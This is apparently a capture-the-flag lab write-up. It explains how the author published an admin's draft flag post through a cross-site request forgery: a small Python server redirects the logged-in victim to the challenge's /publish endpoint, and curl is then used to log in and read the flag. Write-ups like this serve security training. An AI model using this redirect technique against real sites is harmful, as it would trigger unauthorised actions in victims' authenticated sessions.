# PUBLISHING ADMIN'S DRAFT WITH A CROSS-SITE REDIRECT


In this level I had to use CSRF to publish the flag post. The victim of this challenge logs into `http://challenge.localhost/` as admin user, and then proceeds to visit an "evil" site that I had set up previously, `http://hacker.localhost:1337/`. Now 'hacker.localhost' points to my very own workspace, so I decided to execute a netcat listener on port 1337, but that did not go as expected. Which is when I realized that I had only set up a listener and not an interactive web server.

I made the web server using python this time instead of assembly, after running it through a folder with basic web html. The victim logged in again and I received the following on my server.

```bash
~/server$ python3 -m http.server 1337 --bind 127.0.0.1
Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
127.0.0.1 - - [17/Sep/2026 15:12:54] code 404, message File not found
127.0.0.1 - - [17/Sep/2026 15:12:54] "GET /favicon.ico HTTP/1.1" 404 -
```

This gave me the confirmation that my web server did host the victim and the attack works.

I then proceeded to make a proper web server, which redirects the victim to `http://challenge.localhost/publish`, publishing the flag in the victim's draft. Here is my web server.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://challenge.localhost/publish")
        self.end_headers()

server = HTTPServer(("127.0.0.1", 1337), RedirectHandler)
print("Redirect server running on http://hacker.localhost:1337...")
server.serve_forever()
```

The victim logged in, visited the "evil" site, got redirected to '/publish' and the flag was published to `http://challenge.localhost/`.

After which all I had to do was login as a user with:

```bash
curl -v -d "username=<username>&password=<password>" "http://challenge.localhost/login"
```

then use the session cookie to go to the '/' endpoint:

```bash
curl -v -b "session=<cookie>" "http://challenge.localhost/"
```

The results came out smoothly and I got the flag.
